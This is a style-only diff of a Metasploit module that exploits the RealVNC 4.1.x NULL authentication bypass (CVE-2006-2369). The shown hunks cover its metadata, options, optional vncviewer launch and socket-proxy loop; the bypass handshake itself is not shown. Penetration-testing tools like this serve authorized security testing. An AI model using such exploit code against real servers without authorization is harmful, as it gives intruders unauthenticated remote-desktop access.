@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -5,42 +6,42 @@
 
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'RealVNC NULL Authentication Mode Bypass',
-      'Description'    => %q{
-        This module exploits an Authentication bypass Vulnerability
-        in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
-        listener on LPORT and proxies to the target server
+                      'Name'           => 'RealVNC NULL Authentication Mode Bypass',
+                      'Description'    => %q(
+                        This module exploits an Authentication bypass Vulnerability
+                        in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
+                        listener on LPORT and proxies to the target server
 
-        The AUTOVNC option requires that vncviewer be installed on
-        the attacking machine.
-      },
-      'Author'         =>
-        [
-          'hdm', #original msf2 module
-          'theLightCosine'
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['BID', '17978'],
-          ['OSVDB', '25479'],
-          ['URL', 'http://secunia.com/advisories/20107/'],
-          ['CVE', '2006-2369'],
-        ],
-      'DisclosureDate' => 'May 15 2006'))
+                        The AUTOVNC option requires that vncviewer be installed on
+                        the attacking machine.
+                      ),
+                      'Author'         =>
+                        [
+                          'hdm', # original msf2 module
+                          'theLightCosine'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['BID', '17978'],
+                          ['OSVDB', '25479'],
+                          ['URL', 'http://secunia.com/advisories/20107/'],
+                          ['CVE', '2006-2369']
+                        ],
+                      'DisclosureDate' => 'May 15 2006'))
 
     register_options(
       [
         OptPort.new('RPORT',    [true, "The port the target VNC Server is listening on", 5900 ]),
         OptPort.new('LPORT',    [true, "The port the local VNC Proxy should listen on", 5900 ]),
         OptBool.new('AUTOVNC',  [true, "Automatically launch vncviewer from this host", false])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -54,15 +55,15 @@ class MetasploitModule < Msf::Auxiliary
 
     # If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
     # targetting the proxy listener.
-    if (datastore['AUTOVNC'])
-      unless (check_vncviewer())
+    if datastore['AUTOVNC']
+      unless check_vncviewer
         print_error("The vncviewer does not appear to be installed, exiting...")
         return nil
       end
       print_status("Spawning viewer thread...")
-      view = framework.threads.spawn("VncViewerWrapper", false) {
-          system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
-      }
+      view = framework.threads.spawn("VncViewerWrapper", false) do
+        system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
+      end
     end
 
     # Establishes the connection between the viewier and the remote server
@@ -96,42 +97,40 @@ class MetasploitModule < Msf::Auxiliary
 
     # Handles remaining proxy operations between the two sockets
     closed = false
-    while(closed == false)
-      sockets =[]
+    while closed == false
+      sockets = []
       sockets << client
       sockets << s
-      selected = select(sockets,nil,nil,0)
-      #print_status ("Selected: #{selected.inspect}")
-      unless selected.nil?
+      selected = select(sockets, nil, nil, 0)
+      # print_status ("Selected: #{selected.inspect}")
+      next if selected.nil?
 
-        if selected[0].include?(client)
-          begin
-            data = client.get_once
-            if data.nil?
-              print_error("Client closed connection")
-              closed = true
-            else
-              s.put(data)
-            end
-          rescue
+      if selected[0].include?(client)
+        begin
+          data = client.get_once
+          if data.nil?
             print_error("Client closed connection")
             closed = true
+          else
+            s.put(data)
           end
+        rescue
+          print_error("Client closed connection")
+          closed = true
         end
+      end
 
-        if selected[0].include?(s)
-          begin
-            data = s.get_once
-            if data.nil?
-              print_error("Server closed connection")
-              closed = true
-            else
-              client.put(data)
-            end
-          rescue
-            closed = true
-          end
+      next unless selected[0].include?(s)
+      begin
+        data = s.get_once
+        if data.nil?
+          print_error("Server closed connection")
+          closed = true
+        else
+          client.put(data)
         end
+      rescue
+        closed = true
       end
     end
 
@@ -139,16 +138,18 @@ class MetasploitModule < Msf::Auxiliary
     s.close
     client.close
 
-    if (datastore['AUTOVNC'])
-      view.kill rescue nil
-    end
+    begin
+      view.kill
+    rescue
+      nil
+    end if datastore['AUTOVNC']
   end
 
   def check_vncviewer
     vnc =
-      Rex::FileUtils::find_full_path('vncviewer') ||
-      Rex::FileUtils::find_full_path('vncviewer.exe')
-    if (vnc)
+      Rex::FileUtils.find_full_path('vncviewer') ||
+      Rex::FileUtils.find_full_path('vncviewer.exe')
+    if vnc
       return true
     else
       return false
